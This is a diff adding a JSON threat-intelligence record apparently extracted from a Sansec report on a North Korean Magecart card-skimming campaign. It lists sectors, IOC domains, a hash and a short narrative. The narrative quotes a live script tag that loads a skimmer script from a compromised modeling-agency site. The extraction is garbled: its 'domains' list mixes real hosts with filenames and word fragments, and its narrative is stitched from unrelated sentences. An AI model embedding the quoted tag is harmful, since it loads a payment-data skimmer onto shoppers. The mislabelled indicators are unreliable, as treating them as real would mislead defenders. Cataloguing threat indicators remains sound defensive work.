@@ -1,0 +1,84 @@
+{
+  "attack_ttp_ids": [],
+  "attack_tactic_ids": [],
+  "attack_tactics": [],
+  "delivery_vectors": [
+    "document"
+  ],
+  "sectors": [
+    "Financial",
+    "Media",
+    "Retail",
+    "Technology"
+  ],
+  "infrastructure_hints": {
+    "types": [
+      "c2",
+      "command and control",
+      "dns",
+      "http",
+      "https"
+    ],
+    "tools": [],
+    "domains": [
+      "-agr[.]com",
+      "-cert[.]gov",
+      "360[.]com",
+      "3[.]min",
+      "adshow1[.]dat",
+      "areac",
+      "areac-agr[.]com",
+      "blog[.]alyac",
+      "blog[.]netlab",
+      "check[.]vm",
+      "claires-assets[.]com",
+      "co[.]kr",
+      "customize-gtag[.]min",
+      "cyberscoop",
+      "darvishkhan",
+      "darvishkhan[.]net",
+      "focuscamere[.]com",
+      "forbes",
+      "fortiguard[.]com",
+      "gmaps[.]min",
+      "gtm[.]min",
+      "hotjar[.]min",
+      "jquery[.]validate",
+      "json[.]min",
+      "luxmodelagency",
+      "luxmodelagency[.]com",
+      "min[.]js",
+      "obfuscator[.]io",
+      "papers0urce[.]com",
+      "reuters",
+      "rewterz",
+      "sansec[.]io",
+      "signedbooksandcollectibles[.]com",
+      "stefanoturco[.]com",
+      "technokain[.]com",
+      "update6[.]dat",
+      "urlscan[.]io",
+      "us",
+      "virustotal"
+    ]
+  },
+  "iocs": {
+    "hashes": [
+      "9fe97ae18c45e22fe76b8bd5165d0e152bec464d92ef5f7319b1723aba1c0edb"
+    ],
+    "domains": [
+      "sansec.io",
+      "luxmodelagency.com",
+      "signedbooksandcollectibles.com",
+      "technokain.com",
+      "darvishkhan.net"
+    ],
+    "mutexes": []
+  },
+  "narrative": "The IP is hardcoded in the RAT, and used as a command and control (C2) server. The injected script customize-gtag.min.js 12 is scrambled with a popular Javascript obfuscator13. The first campaign: clienToken= <script src=\"https://www.luxmodelagency.com/wp-includes/js/customize-gtag.min.js\"></script> On June 23rd, 2019, Sansec discovered a skimmer on a US truck parts store that uses a compromised Italian modeling site11 to harvest payment data.",
+  "_meta": {
+    "label": "G0032",
+    "doc_id": "1ef0b7b4a48d",
+    "source_pdf": "/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT_CyberCriminal_Campagin_Collections/2020/2020.07.06_North_Korean_Magecart/North Korean hackers are skimming US and European shoppers – Sansec.pdf"
+  }
+}
